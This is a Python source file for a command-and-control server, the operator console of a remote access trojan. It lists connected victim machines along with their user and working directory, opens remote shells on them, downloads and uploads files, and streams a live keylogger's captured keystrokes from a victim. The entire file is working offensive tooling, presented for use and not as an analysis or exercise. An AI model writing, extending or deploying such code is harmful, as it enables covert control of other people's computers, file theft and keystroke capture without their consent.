import os
import socket, threading, time
import sys
import signal
from xml.dom import IndexSizeErr

SERVER_ADDR = "127.0.0.1"
SERVER_PORT = 8080
BUFFER_SIZE = 1024 * 128 #128KB max size
CURRENT_CONNECTIONS = []
CURRENT_ADDRESSES = []

#If the user starts the server and wants to specify the ip to host on
if len(sys.argv) == 2:
    SERVER_ADDR = sys.argv[1]
elif len(sys.argv) == 3:
    SERVER_ADDR = sys.argv[1]
    SERVER_PORT = int(sys.argv[2])

server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_sock.bind((SERVER_ADDR, SERVER_PORT))

#Start server and listen for new connections
def startServer():
    server_sock.listen(5)
    print()
    print(f"Server is listening on {SERVER_ADDR}:{SERVER_PORT}")
    print()
    SERVER_UP = True
    try:
        while SERVER_UP:
            client_sock, addr = server_sock.accept()
            # print(f"\n[SERVER] New Connection Received From: {addr[0]}:{addr[1]}")
            # print()
            CURRENT_CONNECTIONS.append(client_sock)
            CURRENT_ADDRESSES.append(addr)
            # print(f"[SERVER] Active Connections: {threading.activeCount() - 6}")
            # print("cmd>")
    except (KeyboardInterrupt, SystemExit, ConnectionAbortedError):
        shutdown_clients()
        server_sock.close()
        SERVER_UP = False
        
#Take socket and addr and issue shell
def handleClient(client_sock,addr):
    while True:
        try:
            user_in = input()
            if user_in == 'exit':
                client_sock.send(user_in.encode())
                break
            elif user_in == '':
                print(f"{addr[0]}>",end='')
            elif user_in.split()[0] == "cd":
                client_sock.send(user_in.encode())
                print(f"{addr[0]}>",end='')
                continue
            else:
                client_sock.send(user_in.encode())
                client_sock.settimeout(3.0) #timeout after 3 seconds of no recv
                serv_resp = client_sock.recv(BUFFER_SIZE).decode()
                client_sock.settimeout(None) #reset timeout
                print(f"{serv_resp}")
                print(f"{addr[0]}>",end='')
        except socket.timeout as e:
            print("Process timed out. \n" + str(e))
            print(f"{addr[0]}>",end='')
        except BrokenPipeError as e:
            print("Connection closed. Broken pipe.")
            break
        except Exception as e:
            print("Error sending command! \n" + str(e))
            print(f"{addr[0]}>",end='')
            continue
    
#Main Console for C2
def handleCommand():
    while True:
        try:
            cmd = input("cmd> ")
            if cmd.lower() == "list" or cmd.lower() == "ls":
                list_clients()
            elif "select" in cmd.lower() or "sel" in cmd.lower():
                client_console(cmd)
                # client,addr = select_client(cmd)
                # if client == None:
                #     print("Client does not exist!")
                # else:
                #     handleClient(client,addr)
            elif cmd.lower() == "help":
                print("\nHelp Menu: \n\tUse 'list' to list active connections. \
                    \n\tUse 'select' to choose a client from the list. \
                    \n\tUse 'help' to show this menu. \
                    \n\tUse 'exit' to quit the program.")
            elif cmd.lower() == "exit":
                print("[SERVER] Server is closing. Goodbye!")
                #SHUTDOWN ALL CONNECTIONS
                shutdown_clients()
                server_sock.close()
                break
            else:
                print("Command unknwon. Use 'help' to list commands.")
        except (KeyboardInterrupt, SystemExit, ConnectionAbortedError):
            print("\nUse 'exit' to close.")
        except Exception as e:
            print("Invalid use of command! \n" + str(e))
            

#List Current Connections
def list_clients():
    results = ""
    i = 0
    for client in CURRENT_CONNECTIONS:
        try:
            cwd = None
            client.send(str.encode('pwd'))
            cwd = client.recv(201480).decode()
            client.send(str.encode('whoami'))
            whoami = client.recv(201480).decode()
            whoami = whoami.strip()
            if cwd is None:
                CURRENT_CONNECTIONS.remove(i)
                CURRENT_ADDRESSES.remove(i)
        except:
            del CURRENT_CONNECTIONS[i]
            del CURRENT_ADDRESSES[i]
            continue

        results += str(i) + " - " + whoami + "@" + str(CURRENT_ADDRESSES[i][0]) + ":" + str(CURRENT_ADDRESSES[i][1]) + ":" + str(cwd) + "\n"
        i+=1

    if len(CURRENT_CONNECTIONS) != 0:
        print("[SERVER] ACTIVE CLIENTS:")
        print(results)
    else:
        print("No active connections!")


#Console to send commands to a client when user selects client
def client_console(cmd):
    try:
        target = cmd.replace("select ", "")
        target = cmd.replace("sel ", "")
        target = int(target)
        print("Connected to: " + str(CURRENT_ADDRESSES[target][0]) + ":" + str(CURRENT_ADDRESSES[target][1]))
        while True:
            print("Console: " + str(CURRENT_ADDRESSES[target][0])+">",end="")
            newCMD = input()
            if "shell" in newCMD:
                client = CURRENT_CONNECTIONS[target]
                addr = CURRENT_ADDRESSES[target]
                if client == None:
                    print("Client does not exist!")
                else:
                    print("Active Shell On: " + str(CURRENT_ADDRESSES[target][0]) + ":" + str(CURRENT_ADDRESSES[target][1]))
                    print("\n" + str(CURRENT_ADDRESSES[target][0]) + ">",end = '')
                    handleClient(client,addr)
            elif "dl" in newCMD: #Download file
                download_file(newCMD,CURRENT_CONNECTIONS[target])
            elif "up" in newCMD: #Upload file
                upload_file(newCMD,CURRENT_CONNECTIONS[target])
            elif "keylogger" in newCMD:
                start_keylog(newCMD, CURRENT_CONNECTIONS[target])
            elif "help" in newCMD: #Help menu
                print("\nHelp Menu:\
                    \n\tUse 'exit' to return to main menu. \
                    \n\tUse 'help' to show this menu. \
                    \n\tUse 'shell' to gain a shell on the client's machine \
                    \n\tUse 'dl' to download a file.\
                    \n\tUse 'ul' to upload a file.\
                    \n\tUse 'keylogger' to start a live keylog of the clients machine. \n")
            elif "exit" in newCMD:
                break
            else:
                print("Command unknwon. Use 'help' to list commands.")
    except Exception as e:
        print("Invalid use of command! \n" + str(e))

#Used to break keylogger with ctrl-z
def ctrlC(signum, frame):
    raise KeyboardInterrupt

def start_keylog(cmd,conn):
    signal.signal(signal.SIGTSTP, ctrlC)
    signal.signal(signal.SIGTERM, ctrlC)
    print("Keylogger starting...\nIMPORTANT:\nUse ctrl+z & ctrl+c to end logging.")
    conn.send("START_KEYL0GGER".encode())
    try:
        log = ''
        print()
        os.system('cls' if os.name == 'nt' else 'clear') #Clear the screen. Use cls on Windows or clear on Unix
        while True:
            print("Keylogger in progress...\nUse ctrl+z & ctrl+c to end logging.\n")
            print(f"{log}",end="\r")
            out = conn.recv(BUFFER_SIZE).decode()
            os.system('cls' if os.name == 'nt' else 'clear') #Clear the screen. Use cls on Windows or clear on Unix
            if out == "BACKSPACE": #If the user hit backspace, delete one keystroke from the string
                try:
                    if log[len(log)-1] == ")": #check if the last char is a ), it might be a Key.
                        i = len(log)-1 #Set i = length of the log - 1
                        while(log[i]) != "(": #Iterate backwards until we find a (
                            i-=1
                        if log[i:i+4] == "(Key": #If the string is '(Key' then we found a key to delete. 
                            log = log[:i-1] #Delete the keystroke and one char before it
                        else:
                            log = log[:-1]
                    else:
                        log = log[:-1] #If the last char isn't a ), then just delete one char
                except IndexError:
                    log = log[:-1] + ' ' #If index out of bounds, just delete one and add a space
            elif out == "ENTER": #If the user hit enter, make a new line
                log += "\n"
            else:
                log += out

    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear') #Clear the screen. Use cls on Windows or clear on Unix
        conn.send("KEY_L0GGER-END".encode())
        print("Keylogger ending... Returning to client menu.")
        

def download_file(cmd,conn):
    try:
        conn.send(("DOWNLOAD_FILE_FROM_S3RVER").encode()) #Tell client we want to download
        path = cmd.replace("dl ","") #Get the path of the requested download
        if conn.recv(BUFFER_SIZE).decode() == "READY": #Wait for client to be ready
            conn.send(path.encode()) #Send the path to client
            path = path.split("/") #Split the path by slash
            with open(path[len(path)-1],"ab") as f: #Open a file with just the filename
                data = conn.recv(BUFFER_SIZE) #Recieve data from client
                while data: #While data is not None
                    if data.decode() == "DOWNLOADING_FILE_FROM_S3RVER_COMPLETE": #If it is done, break
                        break
                    elif data.decode() == "DOWNLOAD_ERROR": #If there's an error, tell us and break
                        print("File was not found on target machine.")
                        break
                    f.write(data) #Write to the file
                    conn.send("ACK".encode()) #Tell the client we got it
                    data = conn.recv(BUFFER_SIZE) #Wait for more data
            print(path[len(path)-1] + " saved to: " + os.getcwd()) #Print that the file was downloaded and saved
    except KeyboardInterrupt as e:
        print("File Download Stopped.")

def upload_file(cmd,conn):
    try:
        path = cmd.replace("up ","")
        conn.send(("UPLOADING_FILE_FROM_S3RVER").encode())
        if conn.recv(BUFFER_SIZE).decode() == "READY":
            conn.send(path.encode())
            with open(path,"rb") as f:
                data = f.read(BUFFER_SIZE)
                while data:
                    conn.send(data)
                    if(conn.recv(BUFFER_SIZE).decode()) == "ACK":
                        data = f.read(BUFFER_SIZE)
                    else:
                        print("An error has occured!")
                        break

                conn.send("UPLOADING_FILE_FROM_S3RVER_COMPLETE".encode())
                if conn.recv(BUFFER_SIZE).decode() == "DONE":
                    print("File uploaded successfully!")

    except FileNotFoundError or FileExistsError as e:
        conn.send("UPLOADING_FILE_FROM_S3RVER_COMPLETE".encode())
        print("File not found! \n"+ str(e))
    except KeyboardInterrupt:
        print("File Upload Stopped.")


#Start server as a thread to constantly accept new clients, then open the C2 console.
def create_threads():
    t = threading.Thread(target=startServer) 
    t.daemon = True
    t.start()
    time.sleep(1)
    handleCommand()

#Disconnect all clients and end sockets
def shutdown_clients():
    for conn in CURRENT_CONNECTIONS:
        conn.send("SERVER_SHUTDOWN".encode())

if __name__ == "__main__":
    print("[SERVER] Server is starting...") 
    create_threads()

